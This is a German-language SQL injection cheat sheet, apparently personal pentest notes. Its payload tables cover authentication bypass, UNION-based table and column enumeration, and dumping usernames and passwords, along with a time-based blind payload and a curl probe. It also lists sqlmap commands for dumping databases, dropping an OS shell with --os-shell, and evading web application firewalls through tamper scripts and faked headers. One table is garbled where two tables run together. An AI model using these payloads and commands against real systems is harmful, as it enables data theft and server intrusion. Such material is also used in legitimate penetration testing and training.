| Befehl                                                  | Beschreibung         |
| ------------------------------------------------------- | -------------------- |
| `SELECT * FROM users`                                   | Alle Daten anzeigen  |
| `SELECT username FROM users WHERE id=1`                 | Nur bestimmte Spalte |
| `INSERT INTO users (user,pass) VALUES ('admin','1234')` | Neue Zeile einfügen  |
| `UPDATE users SET pass='newpass' WHERE user='admin'`    | Daten ändern         |
| `DELETE FROM users WHERE id=3`                          | Zeile löschen        |

Typische Injection-Punkte:
- GET-Parameter (/page.php?id=1)
- POST-Formulare
- HTTP-Headers (User-Agent, Referer, Cookie)

| Ziel                    | Payload                                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------------------- |
| Test auf Verwundbarkeit | `' OR '1'='1`                                                                                  |
| Kommentar nutzen        | `' -- ` oder `' #`                                                                             |
| Tabelle erraten         | `' UNION SELECT null, table_name FROM information_schema.tables -- `                           |
| Spalten erraten         | `' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' -- ` |
| Dump-Daten              | `' UNION SELECT username,password FROM users -- `               _______________________________|
|                         | Technik                                                        |
| ------------------------| -------------------------------------------------------------- |
| Cookie- oder Header-SQLi| `--cookie=...` / `--headers=...`                               |
| Login-Formulare         | `--data="user=...&pass=..."`                                   |
| JSON-RPC / API          | `--data='{"id":1}' --headers="Content-Type: application/json"` |
| Auth Bypass             | `' OR 1=1 -- ` + URL fuzzing                                   |
| Blind SQLi              | `--technique=T --level=5 --risk=3 --time-sec=5`                |



curl -s "http://target.com/page.php?id=1'"
# → Fehlerseite, Serverfehler, verzögerte Antwort = pot. SQLi

' OR IF(1=1, SLEEP(5), 0) -- 
# → Verzögerung = Erfolg


sqlmap -u "http://target.com/page.php?id=1" --batch
| Zweck                   | Befehl                                     |
| ----------------------- | ------------------------------------------ |
| Datenbanknamen anzeigen | `--dbs`                                    |
| Tabellen anzeigen       | `-D <db> --tables`                         |
| Spalten anzeigen        | `-D <db> -T <table> --columns`             |
| Daten extrahieren       | `-D <db> -T <table> -C <col1,col2> --dump` |

| Option               | Bedeutung                              |
| -------------------- | -------------------------------------- |
| `--batch`            | Automatische Antworten (keine Prompts) |
| `--cookie`           | Manuelle Session nutzen                |
| `--data`             | POST-Daten übergeben                   |
| `--level=N`          | Scan-Tiefe (1–5, default: 1)           |
| `--risk=N`           | Risiko-Level (1–3, default: 1)         |
| `--random-agent`     | User-Agent rotieren                    |
| `--technique=BEUSTQ` | Techniken definieren                   |
| `--os-shell`         | Remote Shell droppen (wenn möglich)    |
| `--threads=10`       | Parallelisierung                       |


**📦 POST/JSON/Custom Header Beispiel**
sqlmap -u "http://target.com/login" \
--data="user=admin&pass=123" \
--cookie="PHPSESSID=..." \
--headers="X-Forwarded-For: 127.0.0.1" \
--batch --dump

sqlmap -u "http://target/api" --data '{"id":"1"}' --batch --headers="Content-Type: application/json"


' OR 1=1 --
' OR 'a'='a
admin' -- 


# WAF-Bypass & Obfuscation
sqlmap -u ... --tamper=between,charencode,space2comment
--list-tampers


| Fehler                | Ursache / Lösung                                                   |
| --------------------- | ------------------------------------------------------------------ |
| 403 Forbidden         | WAF → Header faken, `--random-agent`, Proxy nutzen                 |
| Kein Output           | Level/Risk erhöhen (`--level=5 --risk=3`)                          |
| SQLmap erkennt nichts | Manuell testen, Payload anpassen                                   |
| Keine Shell           | DB hat keinen Out-of-Band-Zugriff (z. B. MySQL ohne `xp_cmdshell`) |



| Tool             | Funktion                              |
| ---------------- | ------------------------------------- |
| **sqlmap**       | Automatisierung                       |
| **Burp Suite**   | Manuelles Fuzzing, Intercept          |
| **ffuf / wfuzz** | Param-Fuzzing (z. B. hidden GET/POST) |
| **sqlninja**     | MSSQL-focused Exploits                |
| **NoSQLMap**     | MongoDB-Injection Exploits            |
